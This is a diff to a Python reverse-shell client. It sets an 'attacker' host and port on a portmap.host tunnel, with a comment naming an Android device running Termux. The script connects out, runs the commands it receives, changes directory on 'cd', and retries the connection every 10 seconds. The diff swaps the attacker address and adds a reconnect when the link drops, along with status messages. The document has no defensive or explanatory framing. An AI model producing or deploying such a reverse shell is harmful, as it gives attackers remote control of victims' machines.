@@ -4,16 +4,17 @@ import os
 import time
 
 # Set up the IP and port of the attacker's machine (your Android device)
-attacker_ip = 'Tec-404-26276.portmap.host'  # Replace with your Android device's IP
-attacker_port = 44664  # The port you are listening on in Termux
-## This will listen on local port "4545"
+attacker_ip = 'TEC-Sadman-35345.portmap.host'  # Replace with your Android device's IP
+attacker_port = 35345  # The port you are listening on in Termux
 
 def connect_shell():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((attacker_ip, attacker_port))
+        print("Connection established.")
         return s
     except Exception as e:
+        print(f"Connection failed: {e}")
         return None
 
 # Start in the user's home directory
@@ -27,8 +28,15 @@ while True:
                 # Receive command from the attacker
                 command = sock.recv(1024).decode("utf-8")
 
+                if not command:
+                    # If no command is received, reconnect
+                    print("Connection lost. Reconnecting...")
+                    sock.close()
+                    break
+
                 if command.lower() == "exit":
                     sock.close()
+                    print("Exiting shell.")
                     break
 
                 # Change the current directory if the command is 'cd'
@@ -55,4 +63,6 @@ while True:
                 sock.send(f"Error: {str(e)}\n".encode("utf-8"))
                 break
     else:
-        time.sleep(10)  # Retry connection every 10 seconds
+        # If connection fails, retry after 10 seconds
+        print("Retrying connection...")
+        time.sleep(10)
